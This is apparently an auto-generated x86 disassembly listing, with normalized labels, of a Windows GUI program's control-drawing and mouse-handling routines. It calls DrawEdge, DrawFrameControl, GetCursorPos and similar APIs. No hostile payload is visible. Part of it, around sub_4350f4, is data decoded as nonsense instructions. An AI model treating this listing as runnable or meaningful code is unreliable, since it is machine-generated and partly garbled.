mov [ esi + 0x182 ] 0x3
jmp r-xdata
xor eax eax
mov al [ esi + 0x178 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xf
push eax
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
setb al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41e234
push eax
call DrawEdge
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41e234
push eax
call DrawFrameControl
jmp r-xdata
or ebx 0x200
cmp [ esi + 0x181 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x4
jmp r-xdata
xor ebx ebx
cmp [ esi + 0x180 ] 0x0
je r-xdata
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x19 ]
push eax
call InflateRect
test [ esi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x2
mov [ ebp - 0x9 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x19 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
test bl bl
jne r-xdata
mov al [ ebp - 0x9 ]
sub al 0x2
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x182 ] 0x3
jne r-xdata
cmp [ esi + 0x178 ] 0x0
jne r-xdata
call sub_436540
lea ecx [ ebp - 0x28 ]
mov edx ebx
call sub_436944
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_41e234
push eax
call sub_436540
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43672c
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41e234
push eax
call sub_436540
lea ecx [ ebp - 0x28 ]
pop edx
call sub_436690
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
call sub_436540
lea ecx [ ebp - 0x28 ]
mov dl [ ebp - 0x9 ]
call sub_436884
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_41e234
push eax
call sub_436540
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43672c
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41e234
push eax
call sub_436540
lea ecx [ ebp - 0x28 ]
pop edx
call sub_436690
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
mov bl 0x2
dec al
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ esi + 0x70 ]
call sub_41d9c8
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_41dda0
lea ecx [ ebp - 0x8 ]
xor edx edx
xor eax eax
call sub_412edc
test bl bl
je r-xdata
cmp [ ebp - 0x9 ] 0x4
jne r-xdata
mov bl 0x3
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x40 ]
mov eax esi
call sub_442550
mov eax [ ebp - 0x40 ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_44487c
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_434234
mov edx 0xff000014
mov eax 0xff00000f
call sub_4246e4
mov edx eax
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_41d99c
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_41dda0
cmp [ esi + 0x181 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4348ad
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_4040b8
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax 0x1
call sub_412edc
jmp r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41d1d4
mov bl 0x4
jmp r-xdata
dec al
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x3c ]
mov eax esi
call sub_442550
mov eax [ ebp - 0x3c ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_44487c
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_434234
jmp r-xdata
mov bl 0x5
jmp r-xdata
sub_4348b4
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_440dfc
cmp esi eax
sete bl
xor bl 0x1
mov [ esi + 0x181 ] bl
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax esi
call sub_443750
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax esi
call sub_443750
jmp r-xdata
sub_434918
push ebx
mov ebx eax
mov eax ebx
call sub_444658
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx eax
mov eax [ ebx + 0x16c ]
call sub_4336ec
pop ebx
retn
sub_434944
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_443b64
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
jne r-xdata
mov [ esi + 0x171 ] 0x1
mov [ esi + 0x182 ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43499c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_443e1c
cmp [ ebx + 0x171 ] 0x0
je r-xdata
cmp [ ebx + 0x181 ] 0x0
jne r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_4348b4
mov [ ebp - 0x2 ] 0x3
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
mov al [ ebp - 0x2 ]
cmp al [ ebx + 0x182 ]
je r-xdata
mov eax ebx
call sub_441f54
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
mov al [ ebp - 0x2 ]
mov [ ebx + 0x182 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_441f98
cmp edi eax
jg r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x2 ] 0x3
jmp r-xdata
sub_434a3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_443ec4
cmp [ ebx + 0x171 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ ebx + 0x171 ] 0x0
test esi esi
jl r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_441f54
cmp esi eax
jge r-xdata
mov [ ebp - 0x3 ] al
cmp [ ebx + 0x168 ] 0x0
jne r-xdata
test edi edi
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov [ ebx + 0x182 ] 0x0
mov [ ebx + 0x181 ] 0x0
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax ebx
call sub_441f98
cmp edi eax
jle r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov dl [ ebx + 0x170 ]
xor dl 0x1
mov eax ebx
call sub_434bf4
cmp [ ebx + 0x170 ] 0x0
je r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebx + 0x182 ] 0x3
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov eax ebx
call sub_4348b4
mov eax ebx
mov si 0xffeb
call sub_403540
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_434b88
push esi
mov esi eax
test dl dl
jae r-xdata
cmp dl 0x4
jbe r-xdata
mov dl 0x1
jmp r-xdata
mov eax [ esi + 0x16c ]
cmp dl [ eax + 0x20 ]
je r-xdata
mov dl 0x4
pop esi
retn
call sub_4336c4
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_434bbc
add esp 0xfffffff0
mov edx [ eax + 0x168 ]
test edx edx
je r-xdata
add esp 0x10
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0xb018
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] eax
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov eax [ eax + 0x30 ]
call sub_445ad4
sub_434bf4
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x168 ] 0x0
jne r-xdata
cmp bl [ esi + 0x170 ]
je r-xdata
xor ebx ebx
pop esi
pop ebx
retn
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov [ esi + 0x170 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov [ esi + 0x182 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x182 ] 0x0
jne r-xdata
mov eax esi
call sub_434bbc
mov [ esi + 0x182 ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
test bl bl
je r-xdata
sub_434cec
push esi
mov esi eax
cmp dl [ esi + 0x178 ]
je r-xdata
pop esi
retn
mov [ esi + 0x178 ] dl
test dl dl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_434d5c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x16c ]
call sub_4336ec
mov eax ebx
call sub_4348b4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_434d90
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x4 ]
cmp eax [ ebx + 0x168 ]
jne r-xdata
pop esi
pop ebx
retn
mov esi [ edx + 0x8 ]
cmp ebx esi
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov al [ esi + 0x172 ]
mov [ ebx + 0x172 ] al
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebx + 0x170 ] 0x0
mov [ ebx + 0x182 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_44ee28
sub_434e00
push ebp
mov ebp esp
push 0x0
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_434e89
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_442550
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45a280
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_403540
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434e90
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_434ecc
push ebx
push esi
mov esi eax
mov eax esi
call sub_4442c8
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
call sub_436540
call sub_436620
test al al
je r-xdata
cmp [ esi + 0x5d ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x181 ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call GetCapture
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_434f40
push ebx
push esi
mov esi eax
mov eax esi
call sub_4442e0
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov [ esi + 0x181 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_436540
call sub_436620
test al al
je r-xdata
cmp [ esi + 0x171 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_434fa8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_434b58
mov ebx eax
mov edx [ esi + 0x34 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax ebx
call sub_422ac0
mov eax [ eax + 0x14 ]
mov edx 0xff00ff
call sub_41d9c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412f04
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_422ac0
pop edx
call sub_41dda0
push 0x0
push edi
push 0x1
mov eax ebx
call sub_422ac0
mov edx eax
xor ecx ecx
mov eax esi
call sub_4501ac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435038
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_444470
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
mov edx [ esi + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_434c80
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434b58
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax [ esi + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ esi + 0x80 ] 0x0
jl r-xdata
mov ebx esi
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_44fc94
cmp eax [ ebx + 0x80 ]
jle r-xdata
push ebp
mov eax esi
mov edx [ eax + 0x80 ]
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_434fa8
pop ecx
sub_4350f4
or al [ eax ]
add [ eax ] al
clc
sub [ ecx ] ecx
xor [ edx ] dh
dec ecx
add [ eax ] al
add [ eax ] al
add ah dh
sub [ ecx ] ecx
in al dx
xor [ ecx ] cl
add [ eax ] al
add [ eax ] al
[ ecx ] ecx
je r-xdata
dec ecx
add [ eax ] al
add [ eax ] al
add ah bl
sub [ ecx ] ecx
inc esp
xor ecx [ ecx ]
add [ eax ] al
add [ eax ] al
fsubr [ ecx ]
dec ecx
add al al
xor al 0x49
add [ eax ] al
add [ eax ] al
add ah dl
sub [ ecx ] ecx
cwde
xor [ ecx ] cl
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43519c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
dec ecx
add [ eax ] al
add [ eax ] al
add ah ch
sub [ ecx ] ecx
test [ ecx ] dh
dec ecx
add [ eax ] al
add [ eax ] al
add al ch
sub [ ecx ] ecx
insb
xor cl [ ecx ]
add [ eax ] al
add [ eax ] al
in al 0x29
dec ecx
add al bl
xor al 0x49
add [ eax ] al
add [ eax ] al
add al ah
sub [ ecx ] ecx
mov eax 0x4932
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4351a3
retn
call sub_4350d8
sub_435529
clc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43559b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_435563
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44aad8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4355a2
lea eax [ ebp - 0x8 ]
call sub_404094
retn
sub_435568
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_442580
call sub_403b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4355a2
lea eax [ ebp - 0x8 ]
call sub_404094
retn
sub_4355ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_435861
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_429aec
lea edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_4242a4
mov edx [ ebp - 0x8 ]
lea eax [ esi + 0x60 ]
call sub_4040e8
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ec74
mov ebx eax
mov [ esi + 0xb8 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_442580
push 0xa9
push 0xc8
mov ecx 0x5
mov edx 0xcc
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
call sub_42f0c4
mov edx 0x6
mov eax ebx
call sub_42f0fc
mov dx 0x1
mov eax ebx
call sub_448fa0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43a15c
mov ebx eax
mov [ esi + 0xbc ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_442580
push 0x9d
push 0x17
mov ecx 0x6
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x1
mov eax ebx
call sub_441a64
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_434384
mov ebx eax
mov [ esi + 0xc0 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push 0x17
push 0x16
mov ecx 0x1
mov edx 0x4d
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
call sub_434b58
mov ecx r-xdata
mov edx [ rw-data ]
call sub_422ee0
lea edx [ ebx + 0x80 ]
mov eax [ rw-data ]
call sub_405ca4
xor edx edx
mov eax ebx
call sub_4426c4
mov dl 0x1
mov eax ebx
call sub_4426a0
mov [ ebx + 0x124 ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x120 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ec74
mov ebx eax
mov [ esi + 0xc4 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_442580
push 0x9d
push 0x91
mov ecx 0x1d
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x5
mov eax ebx
call sub_441a64
mov dl 0x2
mov eax ebx
call sub_42f0a8
mov dl 0x1
mov eax ebx
call sub_42f0c4
xor edx edx
mov eax ebx
call sub_448fa0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e070
mov [ esi + 0xc8 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ebx [ esi + 0xc8 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax ebx
call sub_441a64
mov [ ebx + 0x12c ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x128 ] eax
mov edx [ esi + 0xc4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax ebx
call sub_42e49c
mov dl 0x1
mov eax ebx
call sub_42e46c
mov dl 0x1
mov eax ebx
call sub_42e444
mov [ ebx + 0x17a ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435868
lea eax [ ebp - 0x8 ]
call sub_404094
retn
add esp 0xfffffff0
call sub_403668
sub_435868
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_435a69
xor ebx ebx
call sub_403b4c
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_429cec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435b07
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4040b8
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4040b8
retn
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xbc ]
call sub_442580
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc0 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
xor edx edx
call sub_42e45c
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc4 ]
call sub_442580
sub_435b24
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
xor edx edx
mov [ ebp - 0x34 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_435bfc
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebx + 0x3c ]
push eax
call GetClientRect
lea edx [ ebp - 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
sub edx eax
add edx eax
mov [ ebp - 0x10 ] edx
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xb8 ]
call sub_441f10
lea edx [ ebp - 0x30 ]
mov eax [ ebx + 0xc4 ]
call sub_441ef0
mov edx [ ebp - 0x28 ]
mov eax [ ebx + 0xc0 ]
sub edx [ eax + 0x48 ]
sub edx 0x2
mov eax [ ebx + 0xc0 ]
call sub_441cc0
xor edx edx
mov eax [ ebx + 0xc8 ]
call sub_42e45c
lea eax [ ebx + 0xcc ]
call sub_404094
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x34 ]
mov eax [ ebx + 0xc4 ]
call sub_442580
mov edx [ ebx + 0x3c ]
mov eax [ ebx + 0xb8 ]
call sub_4464b8
mov eax ebx
call sub_429a54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435c03
lea eax [ ebp - 0x34 ]
call sub_404094
retn
sub_435c3c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi eax
xor eax eax
push ebp
push sub_435ea3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45b844
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_435e86
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45c688
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_442580
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_45d008
mov eax [ ebp - 0x4 ]
mov [ eax + 0x22d ] 0x1
mov dl 0x4
mov eax [ ebp - 0x4 ]
call sub_45d668
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e4 ] edi
mov [ eax + 0x1e0 ] r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ec74
mov ebx eax
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_442580
mov dl 0x5
mov eax ebx
call sub_441a64
xor edx edx
mov eax ebx
call sub_42f0c4
mov dl 0x1
mov eax ebx
call sub_42f118
mov edx 0x5
mov eax ebx
call sub_42f0fc
mov edx 0xff000005
mov eax ebx
call sub_4426f0
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov [ ebx + 0x1f8 ] 0x1
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e070
mov esi eax
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax esi
call sub_441a64
mov dl 0x1
mov eax esi
call sub_42e46c
mov dl 0x1
mov eax esi
call sub_42e49c
mov dl 0x1
mov eax esi
call sub_42e444
mov eax [ edi + 0xc8 ]
mov edx [ eax + 0x168 ]
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_4209c4
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xec ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
